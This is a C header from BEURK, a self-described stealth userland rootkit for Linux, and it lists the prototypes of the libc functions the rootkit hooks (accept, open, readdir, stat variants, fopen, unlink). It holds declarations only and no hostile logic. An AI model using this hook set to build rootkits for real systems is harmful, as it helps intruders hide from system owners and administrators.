/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef _DEBUG_H_
# define _DEBUG_H_

# include <dirent.h> /* struct dirent, DIR */
# include <stdio.h> /* FILE */
# include <sys/socket.h> /* struct sockaddr, socklen_t */
# include <sys/stat.h> /* struct stat */

/** Function hooks prototypes
 *
 * This header file contains ALL protypes of hooked functions.
 */

int             accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
int             access(const char *pathname, int mode);
int             rmdir(const char *pathname);
int             open(const char *path, int oflag, ...);
struct dirent   *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
int             stat(const char *pathname, struct stat *buf);
int             stat64(const char *__restrict __file, struct stat64 *buf);
int             __xstat(int __ver, const char *__filename, struct stat *buf);
int             __xstat64(int __ver, const char *__filename, struct stat64 *buf);
int             lstat(const char *path, struct stat *buf);
int             lstat64(const char *path, struct stat64 *buf);
int             __lxstat(int ver, const char *path, struct stat *buf);
int             __lxstat64(int ver, const char *path, struct stat64 *buf);
FILE            *fopen(const char *path, const char *mode);
FILE            *fopen64(const char *path, const char *mode);
int             link(const char *oldpath, const char *newpath);
int             unlink(const char *pathname);
int             unlinkat(int dirfd, const char *pathname, int flags);

#endif /* _DEBUG_H_ */
